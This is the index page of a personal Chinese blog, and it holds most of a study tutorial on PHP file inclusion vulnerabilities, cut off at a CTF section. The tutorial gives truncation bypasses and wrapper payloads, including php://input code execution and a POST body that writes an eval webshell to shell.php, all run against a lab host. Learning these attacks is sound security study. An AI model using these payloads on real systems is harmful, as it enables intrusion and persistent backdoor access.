<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/%E6%88%91%E7%9A%84%E5%AD%A6%E4%B9%A0%20(1).png"><link rel="icon" type="image/png" sizes="16x16" href="/images/%E6%88%91%E7%9A%84%E5%AD%A6%E4%B9%A0.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta name="baidu-site-verification" content="code-ohRVdKq7d5"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=微软雅黑:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"www.zymstudy.club",root:"/",scheme:"Gemini",version:"7.8.0",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:"ftrue",style:"flat"},back2top:{enable:!0,sidebar:!0,scrollpercent:!0},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="生活日常随笔"><meta property="og:type" content="website"><meta property="og:title" content="猪哥的博客"><meta property="og:url" content="https://www.zymstudy.club/index.html"><meta property="og:site_name" content="猪哥的博客"><meta property="og:description" content="生活日常随笔"><meta property="og:locale" content="zh_CN"><meta property="article:author" content="zym"><meta property="article:tag" content="学习随笔"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://www.zymstudy.club/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!0,isPost:!1,lang:"zh-CN"}</script><title>猪哥的博客</title><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?63a74bc13be305eea159120a99117598";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">猪哥的博客</h1><span class="logo-line-after"><i></i></span></a><p class="site-subtitle" itemprop="description">25了还没去过星巴克的可怜猪哥</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">17</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="acchive fa-fw"></i>归档<span class="badge">31</span></a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"><div id="no-result"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></div></header><div class="reading-progress-bar"></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content index posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2021/10/20/hello-world/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2021/10/20/hello-world/" class="post-title-link" itemprop="url">Hello World</a></h2><div class="post-meta"><i class="fa fa-thumb-tack"></i> <font color="7D26CD">置顶</font> <span class="post-meta-divider">|</span> <span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2021-10-20 10:57:46" itemprop="dateCreated datePublished" datetime="2021-10-20T10:57:46+08:00">2021-10-20</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2021-10-24 21:10:30" itemprop="dateModified" datetime="2021-10-24T21:10:30+08:00">2021-10-24</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2021/10/20/hello-world/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2021/10/20/hello-world/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>367</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>1 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/" class="post-title-link" itemprop="url">文件操作之文件包含漏洞全解</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-03-01 20:09:32" itemprop="dateCreated datePublished" datetime="2022-03-01T20:09:32+08:00">2022-03-01</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-03-03 11:37:23" itemprop="dateModified" datetime="2022-03-03T11:37:23+08:00">2022-03-03</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>4.2k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>4 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="文件操作之文件包含漏洞全解"><a href="#文件操作之文件包含漏洞全解" class="headerlink" title="文件操作之文件包含漏洞全解"></a>文件操作之文件包含漏洞全解</h1><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image1.webp" alt="image1"></p><h2 id="一-文件包含漏洞原理简介"><a href="#一-文件包含漏洞原理简介" class="headerlink" title="一.文件包含漏洞原理简介"></a>一.文件包含漏洞原理简介</h2><h3 id="1-文件包含各个脚本代码"><a href="#1-文件包含各个脚本代码" class="headerlink" title="1.文件包含各个脚本代码"></a>1.文件包含各个脚本代码</h3><p><code>&lt;!==#include file=”1.asp”--&gt;</code></p><p><code>&lt;!==#include file=”top.aspx”--&gt;</code></p><p><code>&lt;c:import url=”http://thief.one/1.jsp”&gt;</code></p><p><code>&lt;% include file=”head.jsp”%&gt;</code></p><p><code>&lt;jsp:include page=”head.jsp”/&gt;</code></p><p><code>&lt;?php include(‘test.php’)?&gt;</code></p><h3 id="2-文件包含原理"><a href="#2-文件包含原理" class="headerlink" title="2.文件包含原理"></a>2.文件包含原理</h3><p>传递一个参数（可以是一个文件），然后PHP脚本包含这个文件，则无论这个文件是什么格式，访问PHP脚本，传递参数的文件都能以PHP格式执行。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image2.png" alt="image2"></p><h3 id="3-无限制的本地文件包含测试"><a href="#3-无限制的本地文件包含测试" class="headerlink" title="3.无限制的本地文件包含测试"></a>3.无限制的本地文件包含测试</h3><p>php脚本路径下存在一个1.txt文件</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image3.png" alt="image3"></p><p>访问php脚本并且传递1.txt文件为参数，这样会将这个txt文件以php格式执行</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image4.png" alt="image4"></p><p>单纯的访问txt文件</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image5.png" alt="image5"></p><p>跨越二级目录（运行phptutorial目录下的newfile.txt文件）</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image6.png" alt="image6"></p><h3 id="4-有限制的本地文件包含"><a href="#4-有限制的本地文件包含" class="headerlink" title="4.有限制的本地文件包含"></a>4.有限制的本地文件包含</h3><p>脚本代码（filename后面增加了一个html）</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image7.png" alt="image7"></p><p>传入newfile.txt文件参数（执行失败，因为在当前目录不存在1.txt.html文件）</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image8.png" alt="image8"></p><p><strong>绕过方式1：%00截断（条件：magic_quotes_gpc=off;php版本&lt;5.3.4）</strong></p><p>在url中%00表示ascii码中的0，而ascii中作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已经结束。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image9.png" alt="image9"></p><p><strong>绕过方式2：长度截断（更推荐）</strong></p><p>原理是垃圾数据溢出</p><p>windows中点号需要长于256位（文件命名），Linux中点号需要长于4096位 。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image10.png" alt="image10"></p><h3 id="5-远程文件包含代码测试"><a href="#5-远程文件包含代码测试" class="headerlink" title="5.远程文件包含代码测试"></a>5.远程文件包含代码测试</h3><p>在phpinfo中查看是否可以远程文件包含(allow_url_include这里关闭了)</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image11.png" alt="image11"></p><p>在参数开关中打开</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image12.png" alt="image12"></p><p>已开启</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image13.png" alt="image13"></p><p>在外网服务器上设置一个脚本</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image14.png" alt="image14"></p><p>远程包含该文件（有过滤，同样的在末尾加%00截断，加%23和%20和?都可以），实战情况下就可以将phpinfo换成远程后门文件，然后用菜刀连接。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image15.png" alt="image15"></p><h2 id="二-各种协议流提交流测试"><a href="#二-各种协议流提交流测试" class="headerlink" title="二.各种协议流提交流测试"></a>二.各种协议流提交流测试</h2><h3 id="1-各种协议在脚本下的运行状况（常用的http，https，file，ftp协议）"><a href="#1-各种协议在脚本下的运行状况（常用的http，https，file，ftp协议）" class="headerlink" title="1.各种协议在脚本下的运行状况（常用的http，https，file，ftp协议）"></a>1.各种协议在脚本下的运行状况（常用的http，https，file，ftp协议）</h3><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image16.webp" alt="image16"></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image17.webp" alt="image17"></p><h3 id="2-协议对于远程文件包含漏洞的利用条件（此处举php支持的伪协议例子）"><a href="#2-协议对于远程文件包含漏洞的利用条件（此处举php支持的伪协议例子）" class="headerlink" title="2.协议对于远程文件包含漏洞的利用条件（此处举php支持的伪协议例子）"></a>2.协议对于远程文件包含漏洞的利用条件（此处举php支持的伪协议例子）</h3><p><strong>file://——访问本地文件系统</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image18.webp" alt="image18"></p><p><strong>http://——只读访问HTTP(s)网址</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image19.webp" alt="image19"></p><p><strong>ftp://——访问FTP(s) URLs</strong></p><p><strong>php://——访问各个输入/输出流（I/O streams）</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image20.webp" alt="image20"></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image21.webp" alt="image21"></p><p><strong>zlib://——压缩流</strong></p><p><strong>data://——数据（RFC 2397）</strong></p><p><strong>glob://——查找匹配的文件路径模式</strong></p><p><strong>phar://——PHP 归档</strong></p><p><strong>ssh2://——Secure Shell 2</strong></p><p><strong>rar://——RAR</strong></p><p><strong>ogg://——音频流</strong></p><p><strong>expect://——处理交互式的流</strong></p><h3 id="3-各种协议的利用条件和方法"><a href="#3-各种协议的利用条件和方法" class="headerlink" title="3.各种协议的利用条件和方法"></a>3.各种协议的利用条件和方法</h3><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image22.webp" alt="image22"></p><h3 id="4-标准输入流和输出流的原理"><a href="#4-标准输入流和输出流的原理" class="headerlink" title="4.标准输入流和输出流的原理"></a>4.标准输入流和输出流的原理</h3><ul><li><p>存储量（依次递减）： 外存–&gt;内存–&gt;缓存</p></li><li><p>读取速度（依次递减）： 缓存–&gt;内存–&gt;外存</p></li><li><p>对于内存和外存的理解，我们可以简单的理解为容器，即外存是一个容器，内存又是另外一个容器。</p></li><li><p>将输入输出抽象称为流，就好像水管，将两个容器连接起来。将数据冲外存中读取到内存中的称为输入流，将数据从内存写入外存中的称为输出流。</p></li><li><p>流是一个很形象的概念，当程序需要读取数据的时候，就会开启一个通向数据源的流，这个数据源可以是文件，内存，或是网络连接。类似的，当程序需要写入数据的时候，就会开启一个通向目的地的流。</p></li></ul><h3 id="5-php协议读取newfile-txt文件的源码（注意：PHP协议只能在PHP脚本适用）"><a href="#5-php协议读取newfile-txt文件的源码（注意：PHP协议只能在PHP脚本适用）" class="headerlink" title="5.php协议读取newfile.txt文件的源码（注意：PHP协议只能在PHP脚本适用）"></a>5.php协议读取newfile.txt文件的源码（注意：PHP协议只能在PHP脚本适用）</h3><p><a target="_blank" rel="noopener" href="http://192.168.176.128:10086/test.php?filename=php://filter/read=convert.base64-encode/resource=newfile.txt">http://192.168.176.128:10086/test.php?filename=php://filter/read=convert.base64-encode/resource=newfile.txt</a></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/Users\朱易明\AppData\Roaming\Typora\typora-user-images\image-20220301212338751.png" alt="image-20220301212338751"></p><p><strong>原理：</strong>在文件输入之前先过滤，读取过滤器内的内容，其中resource为要过滤的数据流。</p><p><strong>base64加密原因：</strong>有时候读取由于编码方式的不同造成乱码，这里加密后，就不会乱码。</p><p>然后利用解码工具解码即可。</p><h3 id="6-以php格式执行文件"><a href="#6-以php格式执行文件" class="headerlink" title="6.以php格式执行文件"></a>6.以php格式执行文件</h3><ul><li><p><a target="_blank" rel="noopener" href="http://192.168.176.128:10086/test.php?filename=php://input">http://192.168.176.128:10086/test.php?filename=php://input</a></p></li><li><p>post提交数据：<code>&lt;?php system(ipconfig); ?&gt;</code></p></li></ul><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/23.png" alt="23"></p><p><strong>原理：</strong>php://input可以读取没有处理过的POST数据。相较于$HTTP_RAW_POST_DATA而言，它给内存带来的压力较小，并且不需要特殊的php.ini设置。php://input不能用于enctype=multipart/form-data。</p><h3 id="7-php协议写入一句话后门代码"><a href="#7-php协议写入一句话后门代码" class="headerlink" title="7.php协议写入一句话后门代码"></a>7.php协议写入一句话后门代码</h3><ul><li><a target="_blank" rel="noopener" href="http://192.168.176.128:10086/test.php?filename=php://input">http://192.168.176.128:10086/test.php?filename=php://input</a></li><li>post提交数据：<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;)?&gt;</code></li></ul><p>原理：用fopen打开或者创建一个shell.php的文件，用fputs将字符串<code>&lt;?php @eval($_GET[cmd]); ?&gt;</code>写入shell.php文件中.</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image24.png" alt="image24"></p><p>已写入</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image25.png" alt="image25"></p><h3 id="8-file协议读取文件内容（所有脚本都适用）"><a href="#8-file协议读取文件内容（所有脚本都适用）" class="headerlink" title="8.file协议读取文件内容（所有脚本都适用）"></a>8.file协议读取文件内容（所有脚本都适用）</h3><p>使用条件是file协议需要用到完整路径。</p><p>此处的txt文件居然以php格式执行了。。。。。。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image26.png" alt="image26"></p><h3 id="9-data协议来执行指定的php脚本代码"><a href="#9-data协议来执行指定的php脚本代码" class="headerlink" title="9.data协议来执行指定的php脚本代码"></a>9.data协议来执行指定的php脚本代码</h3><p><strong>使用条件：</strong>allow_url_fopen和allow_url_include开启</p><p><a target="_blank" rel="noopener" href="http://192.168.176.128:10086/test.php?filename=data://text/plain,%3C?php%20echo%20%27123%27%20?%3E">http://192.168.176.128:10086/test.php?filename=data://text/plain,%3C?php%20echo%20%27123%27%20?%3E</a></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image27.png" alt="image27"></p><h3 id="10-总结"><a href="#10-总结" class="headerlink" title="10.总结"></a>10.总结</h3><ul><li><p>伪协议常常用于文件包含漏洞之中。</p></li><li><p>在php中能够造成文件包含的函数有include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile。</p></li><li><p>include函数：可以放在PHP脚本的任意位置，一般放在流程控制的处理部分中。当PHP脚本执行到include指定引入的文件时，才将它包含并尝试执行。当第二次遇到相同文件时，PHP还是会重新解释一次。</p></li><li><p>require函数：一般放在PHP脚本的最前面，PHP执行前就会先读入require指定引入的文件，包含并尝试执行引入的脚本文件。require的工作方式是提高PHP的执行效率，当它在同一个网页中解释过一次后，第二次便不会解释。</p></li><li><p>include_once和require_once函数：分别与require / include作用相同，不同的是他们在执行到时会先检查目标内容是不是在之前已经导入过，如果导入过了，那么便不会再次重复引入其同样的内容。</p></li><li><p>hightfile函数：highlight_file(filename,return) —— filename：必需。要进行高亮处理的 PHP 文件的路径。return：可选。如果设置 true，则本函数返回高亮处理的代码。该函数通过使用 PHP 语法高亮程序中定义的颜色，输出或返回包含在 filename 中的代码的语法高亮版本。</p></li><li><p>show_source函数：该函数是highlight_file函数的别名。</p></li><li><p>file_get_content函数：把整个文件读入一个字符串中。和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。</p></li><li><p>file() 函数：把整个文件读入一个数组中。与 file_get_contents() 类似，不同的是 file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。如果失败，则返回 false 。</p></li></ul><h2 id="三-ctf题目"><a href="#三-ctf题目" class="headerlink" title="三.ctf题目"></a>三.ctf题目</h2><h3 id="1-CTF-南邮大-i-春秋百度杯真题-白盒"><a href="#1-CTF-南邮大-i-春秋百度杯真题-白盒" class="headerlink" title="1.CTF-南邮大,i 春秋百度杯真题-白盒"></a>1.CTF-南邮大,i 春秋百度杯真题-白盒</h3><p>进入南邮靶场：<a target="_blank" rel="noopener" 